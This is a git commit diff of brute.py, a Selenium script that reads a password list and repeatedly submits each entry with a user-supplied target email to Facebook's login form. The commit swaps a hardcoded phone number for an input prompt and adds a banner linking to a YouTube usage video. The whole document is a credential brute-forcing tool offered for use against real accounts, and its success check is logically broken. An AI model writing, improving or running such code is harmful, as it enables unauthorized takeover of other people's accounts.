f02e4ab7b0072d4fa5236874c8c25ea010b07623
rahul-alt <60128717+rahul-alt@users.noreply.github.com>
2023-05-21 11:19:11 +0530

    Add files via upload

--- brute.py
+++ brute.py
@@ -2,15 +2,20 @@ import webbrowser
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 browser = webdriver.Firefox(executable_path="geckodriver.exe")
+print(''' @CREATOR NETWORK SECURITY
+      BRUTE FORCE VERSION 4.3.0   WORDLIST DEFAULT
+      HOW TO USE AVILABEL IN YOUTUBE https://youtu.be/j8F4glPWWw4
+      ''')
 file = open("pass.txt")
 passwd = file.read().splitlines()
+email =input("[enter target]")
 for x in passwd :
     print("reading ",x)
     browser.get("https://www.facebook.com/")
-    browser.find_element(By.NAME, "email").send_keys(8653796431)
+    browser.find_element(By.NAME, "email").send_keys(email)
     browser.find_element(By.NAME, "pass").send_keys(x)
     browser.find_element(By.NAME, "login").click()
-    if browser.get("https://www.facebook.com/mobileprotection?source=mobile_mirror_nux"):
+    if browser.get("https://www.facebook.com/"):
      print("failed",x)
      browser.close()
 else :
